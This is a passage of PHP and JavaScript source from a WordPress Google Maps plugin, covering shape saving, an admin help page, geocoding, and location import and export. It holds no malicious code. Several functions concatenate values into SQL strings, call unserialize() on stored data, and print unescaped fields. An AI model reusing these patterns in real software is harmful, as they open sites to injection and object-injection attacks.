									polyline_cordinate.push(latlngin);	
							
							}
                             
                            );
                            
                            all_polylines.push(polyline_cordinate.join("----")+"..."+settings);
                            
        }
 
       return all_polylines;
       
	
	}
function wpgmp_save_polygons()
{
	
	var all_polygons = [];
        
         for (var i = 0; i < wgmp_polygons.length; i++) {
                            
                            var polygon_cordinate= [];
                            
                            var cordinates=wgmp_polygons[i].getPath();
                            
                            var settings=wgmp_polygons[i].strokeWeight+","+wgmp_polygons[i].strokeOpacity+","+wgmp_polygons[i].strokeColor+","+wgmp_polygons[i].fillColor+","+wgmp_polygons[i].fillOpacity;
                            
                            cordinates.forEach(function(latlng,index)
                            {
							
									var latlngin= [latlng.lat(),latlng.lng()];
									
									if(latlng.lat()!="" && latlng.lng()!="")
									polygon_cordinate.push(latlngin);	
							
							}
						
                            );
                            
                            all_polygons.push(polygon_cordinate.join("----")+"..."+settings);
                            
        }
	   console.log(all_polygons);
       return all_polygons;
	
	}	
	
function wpgmp_save_circles()
{
 
	var all_circles = [];
        
         for (var i = 0; i < wgmp_circles.length; i++) {
                            
                            var circle_cordinate= [];
                            
                            var latlng=wgmp_circles[i].getCenter();
                            
                            var settings=wgmp_circles[i].strokeWeight+","+wgmp_circles[i].strokeOpacity+","+wgmp_circles[i].strokeColor+","+wgmp_circles[i].fillColor+","+wgmp_circles[i].fillOpacity+","+wgmp_circles[i].getRadius();
                            
                            
									var latlngin= [latlng.lat(),latlng.lng()];
									
									if(latlng.lat()!="" && latlng.lng()!="")
									circle_cordinate.push(latlngin);	
							
							all_circles.push(circle_cordinate.join("----")+"..."+settings);
                            
        }
        
       return all_circles;
	
	}
	
function wpgmp_save_rectangles()
{
	
	var all_rectangles = [];
        
         for (var i = 0; i < wgmp_rectangles.length; i++) {
                            
                            var rectangle_cordinate= [];
                            
                            
                            
                            var settings=wgmp_rectangles[i].strokeWeight+","+wgmp_rectangles[i].strokeOpacity+","+wgmp_rectangles[i].strokeColor+","+wgmp_rectangles[i].fillColor+","+wgmp_rectangles[i].fillOpacity;
                            
                            var latlng=wgmp_rectangles[i].getBounds().getSouthWest();
                            
                            
							
									var latlngin= [latlng.lat(),latlng.lng()];
									
									if(latlng.lat()!="" && latlng.lng()!="")
									rectangle_cordinate.push(latlngin);	
							
							
							 
							latlng=wgmp_rectangles[i].getBounds().getNorthEast();
                            
							
									var latlngin= [latlng.lat(),latlng.lng()];
									
									if(latlng.lat()!="" && latlng.lng()!="")
									rectangle_cordinate.push(latlngin);	
							
							
							
						
                         
                            
                            all_rectangles.push(rectangle_cordinate.join("----")+"..."+settings);
                            
        }
	   console.log(all_rectangles);
       return all_rectangles;
	
	}	
	</script>
	<?php
	
	}
function return_post_content($atts, $content=null)
{
	$post = get_post($atts['id']);
	setup_postdata($post);
	$content = "<div><h4>".get_the_title()."</h4>";
	$content .= "<p>".get_the_excerpt()."</p>";
	wp_reset_postdata();
	return $content;
}
add_action('widgets_init' , 'wpgmp_google_map_widget');
add_action('init', 'wpgmp_load_actions');
add_action('admin_init', 'wpgmp_load_actions_admin');
include_once("wpgmp-all-js.php");
include_once("wpgmp-function-js.php");
include_once("wpgmp-add-location.php");
include_once("wpgmp-quick-locations.php");
include_once("wpgmp-manage-location.php");
include_once("wpgmp-create-map.php");
include_once("wpgmp-manage-map.php");
include_once("wpgmp-create-group-map.php");
include_once("wpgmp-manage-group-map.php");
include_once("wpgmp-display-map.php");
include_once("wpgmp-display-locations.php");
include_once("wpgmp-import-location.php");
include_once("wpgmp-drawing.php");
include_once("wpgmp-add-routes.php");
include_once("wpgmp-manage-routes.php");
/**
 * This function used to show success/failure message in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_showMessage($message, $errormsg = false)
{
	if( empty($message) )
	return;
	
	if ( $errormsg ) {
		echo '<div id="message" class="error">';
	}
	else {
		echo '<div id="message" class="updated">';
	}
	echo "<p><strong>$message</strong></p></div>";
} 
/**
 * This function used to show basic instruction for how to use this plugin.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_admin_overview()  {
	?>
	<div class="wpgmp-wrap">
		<div class="col-md-11">
    
		<h3>
		<span class="glyphicon glyphicon-asterisk"></span>
		<?php _e('How to Use', 'wpgmp_google_map') ?>
        </h3>
		<div id="dashboard-widgets-container" class="wpgmp-overview">
		    <div id="dashboard-widgets" class="metabox-holder">
				<div id="post-body">
					<div id="dashboard-widgets-main-content">
						<div class="postbox-container" id="main-container" style="width:75%;">
							<?php _e('Go through the steps below to create your first map:', 'wpgmp_google_map') ?>
							<p>
							<b><?php _e('Step 1', 'wpgmp_google_map') ?></b> - <?php _e('Use our auto suggestion enabled location box to add your location', 'wpgmp_google_map') ?>&nbsp;<a href="<?php echo admin_url('admin.php?page=wpgmp_add_location') ?>"><?php _e('here', 'wpgmp_google_map') ?></a>.&nbsp;<?php _e('You can add multiple locations.All those locations will be available to choose when you create your map.', 'wpgmp_google_map') ?> </li>
							</p>
							<p>
							<b><?php _e('Step 2', 'wpgmp_google_map') ?></b> - <?php _e('Now', 'wpgmp_google_map') ?>&nbsp;<a href="<?php echo admin_url('admin.php?page=wpgmp_create_map') ?>"><?php _e('click here', 'wpgmp_google_map') ?></a>&nbsp;<?php _e('to create a map. You can create as many maps you want to add. Using shortcode, you can add maps on posts/pages.', 'wpgmp_google_map') ?> </li>
							</p>
							<p>
							<b><?php _e('Step 3', 'wpgmp_google_map') ?></b> - <?php _e('When done with administrative tasks, you can display map on posts/pages using ', 'wpgmp_google_map') ?>&nbsp;<a href="<?php echo admin_url('admin.php?page=wpgmp_google_wpgmp_manage_map') ?>"><?php _e('shortcodes', 'wpgmp_google_map') ?></a>.&nbsp;<?php _e('Enable map in the widgets section to display in sidebar', 'wpgmp_google_map') ?> .</li>
							</p>
						</div>
			    		<div class="postbox-container" id="side-container" style="width:24%;">
						</div>						
					</div>
				</div>
		    </div>
		</div>
        
   
		<div style="clear:both"></div>
			<h3>
			<span class="glyphicon glyphicon-asterisk"></span>
			<?php _e('Online Documentation', 'wpgmp_google_map') ?>
            </h3>
		<div id="dashboard-widgets-container" class="wpgmp-overview">
		    <div id="dashboard-widgets" class="metabox-holder">
				<div id="post-body">
					<div id="dashboard-widgets-main-content">
						<div class="postbox-container" id="main-container" style="width:75%;">
							<?php _e('Documentation is available with the zipped package of the purchased plugin or visit our ', 'wpgmp_google_map') ?>&nbsp;<a href="http://www.flippercode.com" target="_blank"><?php _e('Official Website', 'wpgmp_google_map') ?></a>&nbsp;on&nbsp;<a href="http://www.flippercode.com" target="_blank"><?php _e('online documentation', 'wpgmp_google_map') ?></a>&nbsp;
						</div>
			    		<div class="postbox-container" id="side-container" style="width:24%;">
						</div>						
					</div>
				</div>
		    </div>
		</div>
	
	
			<div style="clear:both"></div>
			<h3>
			<span class="glyphicon glyphicon-asterisk"></span>
			<?php _e('Shortcodes', 'wpgmp_google_map') ?>
            </h3>
		<div id="dashboard-widgets-container" class="wpgmp-overview">
		    <div id="dashboard-widgets" class="metabox-holder">
				<div id="post-body">
					<div id="dashboard-widgets-main-content">
						<div class="postbox-container" id="main-container" style="width:75%;">
						<p>This plugin provides shortcodes which helpful for a non-programmer and programmer to display maps dynamically. Below are the shortcode combinations you may use though
						possiblity are endless to create combinations of shortcodes. </p>
						
						<p>
						<h2>Display Map using latitude & longitude</h2>
						</p>
						<p>
						Standard format for shortcode is as below.
						</p>
						<p>
						<code>[display_map marker1="latitude | longitude | infowindow message | draggable | clickable | marker group id"]
						</code>
						
						<ul>
							<li><i>Latitude</i> - Enter latitude of the location.</li>
							<li><i>Longitude </i>- Enter longtidue of the location. </li>
							<li><i>Infowindow message (optional)</i> - Enter message to display by click on marker. HTML Tags are allowed. </li>
							<li><i>Draggable (optional)</i> - Make this marker draggable. options is true/false. Default is false.</li>
							<li><i>Clickable (optional)</i> - Make this marker clickable. options is true/false. Default is true </li>
							<li><i>Marker Group (optional)</i>- Provides id of the group. You can retrive id from  <a href="<?php echo admin_url('admin.php?page=wpgmp_google_wpgmp_manage_group_map'); ?>">Manage Marker Categories</a> page. </li>
						</ul>
						
						So you can display any number of markers using this shortcode. 
						
						</p>
						<p>Below are few examples to understand it better. </p>
						<p>
						<b>Single Location :</i> 
						<code>[display_map marker1="39.639538|-101.527405 | This is first marker's info window message | false | true"]</code><br>
						</p>
						<p>
						<b>Multiple Locations :</i>
						<code>[display_map marker1="39.639538|-101.527405" marker2="39.027719|-111.546936"]
						</code>
						</p>
						
							
						<p>
						<h2>Display Map using Address</h2>
						</p>
						<p>
						Standard format for shortcode is as below.
						</p>
						<p>
						<code>[display_map address1=" New Delhi, india | infowindow message | draggable | clickable | marker group id"]
						</code>
						
						<ul>
							<li><i>Address</i> - Enter address of the location.</li>
							<li><i>Infowindow message (optional)</i> - Enter message to display by click on marker. HTML Tags are allowed. </li>
							<li><i>Draggable (optional)</i> - Make this marker draggable. options is true/false. Default is false.</li>
							<li><i>Clickable (optional)</i> - Make this marker clickable. options is true/false. Default is true </li>
							<li><i>Marker Group (optional)</i>- Provides id of the group. You can retrive id from  <a href="<?php echo admin_url('admin.php?page=wpgmp_google_wpgmp_manage_group_map'); ?>">Manage Marker Categories</a> page. </li>
						</ul>
						So you can display any number of markers using this shortcode. 
						</p>
						<p>Below are few examples to understand it better. </p>
						<p>
						<b>Single Location :</b> 
						<code>[display_map address1="New Delhi, india | This is first marker's info window message | false | true"]</code><br>
						</p>
						<p>
						<b>Multiple Locations :</b>
						<code>[display_map address1="New Delhi, India" address2="Mumbai, India"]
						</code>
						</p>
						
							
						
						</div>
			    		<div class="postbox-container" id="side-container" style="width:24%;">
						</div>						
					</div>
				</div>
		    </div>
		</div>
	
	
	</div>
</div>
</p>
</p>	
	<?php
}
function wpgmp_is_mobile() {
	        static $is_mobile;
	
	        if ( isset($is_mobile) )
	                return $is_mobile;
	
	        if ( empty($_SERVER['HTTP_USER_AGENT']) ) {
	                $is_mobile = false;
	        } elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile') !== false // many mobile devices (all iPhone, iPad, etc.)
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Silk/') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Kindle') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'BlackBerry') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== false
	                || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mobi') !== false ) {
	                        $is_mobile = true;
	        } else {
	                $is_mobile = false;
	        }
	
	        return $is_mobile;
}
function wpgmp_get_coordinates( $content, $force_refresh = false ) {
    $address_hash = md5( $content );
    $coordinates = get_transient( $address_hash );
    if ($force_refresh || $coordinates === false) {
    	$args       = array( 'address' => urlencode( $content ), 'sensor' => 'false' );
    	$url        = add_query_arg( $args, 'http://maps.googleapis.com/maps/api/geocode/json' );
     	$response 	= wp_remote_get( $url );
     	if( is_wp_error( $response ) )
     		return;
     	$data = wp_remote_retrieve_body( $response );
     	if( is_wp_error( $data ) )
     		return;
		if ( $response['response']['code'] == 200 ) {
			$data = json_decode( $data );
			if ( $data->status === 'OK' ) {
			  	$coordinates = $data->results[0]->geometry->location;
			  	$cache_value['lat'] 	= $coordinates->lat;
			  	$cache_value['lng'] 	= $coordinates->lng;
			  	$cache_value['address'] = (string) $data->results[0]->formatted_address;
			  	// cache coordinates for 3 months
			  	set_transient($address_hash, $cache_value, 3600*24*30*3);
			  	$data = $cache_value;
			} elseif ( $data->status === 'ZERO_RESULTS' ) {
			  	return __( 'No location found for the entered address.', 'wpgmp_google_map' );
			} elseif( $data->status === 'INVALID_REQUEST' ) {
			   	return __( 'Invalid request. Did you enter an address?', 'wpgmp_google_map' );
			} else {
				return __( 'Something went wrong while retrieving your map, please ensure you have entered the short code correctly.', 'wpgmp_google_map' );
			}
		} else {
		 	return __( 'Unable to contact Google API service.', 'wpgmp_google_map' );
		}
    } else {
       // return cached results
       $data = $coordinates;
    }
    return $data;
}
function wpgmp_get_address_coordinates( $new_loc_add, $force_refresh = false ) {
    $address_hash = md5( $new_loc_add );
	
    $coordinates = get_transient( $address_hash );
    if ($force_refresh || $coordinates === false) {
    	$args       = array( 'address' => urlencode( $new_loc_add ), 'sensor' => 'false' );
    	$url        = add_query_arg( $args, 'http://maps.googleapis.com/maps/api/geocode/json' );
     	$response 	= wp_remote_get( $url );
     	if( is_wp_error( $response ) )
     		return;
     	$data = wp_remote_retrieve_body( $response );
     	if( is_wp_error( $data ) )
     		return;
		if ( $response['response']['code'] == 200 ) {
			$data = json_decode( $data );
			if ( $data->status === 'OK' ) {
			  	$coordinates = $data->results[0]->geometry->location;
			  	$cache_value['lat'] 	= $coordinates->lat;
			  	$cache_value['lng'] 	= $coordinates->lng;
			  	$cache_value['address'] = (string) $data->results[0]->formatted_address;
			  	// cache coordinates for 3 months
			  	set_transient($address_hash, $cache_value, 3600*24*30*3);
			  	$data = $cache_value;
			} elseif ( $data->status === 'ZERO_RESULTS' ) {
			  	return __( 'No location found for the entered address.', 'wpgmp_google_map' );
			} elseif( $data->status === 'INVALID_REQUEST' ) {
			   	return __( 'Invalid request. Did you enter an address?', 'wpgmp_google_map' );
			} else {
				return __( 'Something went wrong while retrieving your map, please ensure you have entered the short code correctly.', 'wpgmp_google_map' );
			}
		} else {
		 	return __( 'Unable to contact Google API service.', 'wpgmp_google_map' );
		}
    } else {
       // return cached results
       $data = $coordinates;
    }
    return $data;
}
function wpgmp_location_export($action,$results, $asFilename, $attachment = false, $headers = true) {
global $wpdb;	

if( $action == 'export_csv' )
{
   if( $attachment )
   {
		header( 'Content-Type: text/csv' );
		header( 'Content-Disposition: attachment;filename="'.$asFilename.'.csv"');
		$fp = fopen('php://output', 'w');
   }
   else
   {
		$fp = fopen($asFilename.'csv', 'w');
   }
  
   if($results)
   {
		fputcsv($fp,  array('Title','Address','Draggable','Disable Infowindow','Latitude','Longitude','Message','Marker Category Title'));
	
		foreach($results as $result)
		{
			$cat_title = $wpdb->get_row('SELECT group_map_title FROM '.$wpdb->prefix.'group_map WHERE group_map_id='.$result->location_group_map.'');
			$message = unserialize(base64_decode($result->location_messages));
			$infowindow_settings = unserialize($result->location_settings);
			
			fputcsv($fp,array($result->location_title,$result->location_address,$result->location_draggable,$infowindow_settings['hide_infowindow'],$result->location_latitude,$result->location_longitude,$message['googlemap_infowindow_message_one'],$cat_title->group_map_title));
		}
   }
   fclose($fp);
}
else if( $action == 'export_xml' )
{	
	$table = $wpdb->prefix."map_locations";
 	header('Content-type: text/xml');
	header('Content-Disposition: attachment; filename="'.$asFilename.'.xml"');
 
	$xml ='<?xml version="1.0" encoding="UTF-8"?>';
    
	$xml .=  "
    <locations>";
	foreach($results as $result)
	{
		$cat_title = $wpdb->get_row('SELECT group_map_title FROM '.$wpdb->prefix.'group_map WHERE group_map_id='.$result->location_group_map.'');
		$message = unserialize(base64_decode($result->location_messages));
		$infowindow_settings = unserialize($result->location_settings);
		$xml .=  "
		<location>";
			$xml .="
			<title>".wpgmp_xmlEscape($result->location_title)."</title>
			<address>".wpgmp_xmlEscape($result->location_address)."</address>
			<draggable>".$result->location_draggable."</draggable>
			<disable_infowindow>".$infowindow_settings['hide_infowindow']."</disable_infowindow>
			<latitude>".$result->location_latitude."</latitude>
			<longitude>".$result->location_longitude."</longitude>
			<message>".wpgmp_xmlEscape($message['googlemap_infowindow_message_one'])."</message>
			<marker_category_title>".wpgmp_xmlEscape($cat_title->group_map_title)."</marker_category_title>";
	   $xml .="
	   </location>";
   }
   $xml .=  "
   </locations>";
		
   echo $xml;
   exit;			
}
else if( $action == 'export_excel' )
{
	header('Content-Type: application/xls');
	header('Content-Disposition: attachment; filename="'.$asFilename.'.xls"');
	
	$sep = "\t";
	
	echo "Title".$sep."Address".$sep."Draggable".$sep."Disable Infowindow".$sep."Latitude".$sep."Longitude".$sep."Message".$sep."Marker Category Title\n";
	
	foreach($results as $result)
	{
		$cat_title = $wpdb->get_row('SELECT group_map_title FROM '.$wpdb->prefix.'group_map WHERE group_map_id='.$result->location_group_map.'');
		$message = unserialize(base64_decode($result->location_messages));
		$infowindow_settings = unserialize($result->location_settings);
		echo $result->location_title.$sep.$result->location_address.$sep.$result->location_draggable.$sep.$infowindow_settings['hide_infowindow'].$sep.$result->location_latitude.$sep.$result->location_longitude.$sep.$message['googlemap_infowindow_message_one'].$sep.$cat_title->group_map_title."\n";
	}
}
else if( $action == 'export_json' )
{	
   if( $attachment )
   {
		header( 'Content-Type: text/json' );
		header( 'Content-Disposition: attachment;filename="'.$asFilename.'.json"');
		$fp = fopen('php://output', 'w');
   }
   else
   {
		$fp = fopen($asFilename.'json', 'w');
   }
   
   foreach($results as $result) {
	    $message = unserialize(base64_decode($result->location_messages));
	    $infowindow_settings = unserialize($result->location_settings);
		
		if(empty($infowindow_settings['disable_infowindow']))
		$infowindow_settings['disable_infowindow']=false;
		
		$cat_title = $wpdb->get_row('SELECT group_map_title FROM '.$wpdb->prefix.'group_map WHERE group_map_id='.$result->location_group_map.'');
		
	    $json[] = array(
	    'title' => $result->location_title,
	    'address' => $result->location_address,
	    'draggable' => $result->location_draggable,
		'disable_infowindow' => $infowindow_settings['hide_infowindow'],
	    'latitude' => $result->location_latitude,
	    'longitude' => $result->location_longitude,
	    'message' => $message['googlemap_infowindow_message_one'],
	    'marker_category_title' => $cat_title->group_map_title
		);
   }
	
   fwrite($fp, json_encode($json));
   fclose($fp);
}
}

function wpgmp_import_save_locations($location_data)
{
		global $wpdb;
		
		if( trim($location_data['latitude'])=='' or trim($location_data['longitude'])=='')
		return;
		
		 $locations_table = $wpdb->prefix."map_locations";
		
			  $infowindow['googlemap_infowindow_message_one'] = $location_data['message'];
			  $messages = base64_encode(serialize($infowindow));
 
			  $save_locations = array(
			  'location_title' => htmlspecialchars(stripslashes($location_data['title'])),
			  'location_address' => htmlspecialchars(stripslashes($location_data['address'])),
			  'location_draggable' => $location_data['draggable'],
			  'location_settings' => serialize(array("hide_infowindow"=>$location_data['disable_infowindow'])),
			  'location_latitude' => $location_data['latitude'],
			  'location_longitude' => $location_data['longitude'],
			  'location_group_map' => $location_data['marker_category_id'],
			  'location_messages' => $messages
			  );
			  
			  $wpdb->insert($locations_table,$save_locations);
}

function wpgmp_xmlEscape($string) {
    return str_replace(array('&', '<', '>', '\'', '"'), array('&amp;', '&lt;', '&gt;', '&apos;', '&quot;'), $string);
}
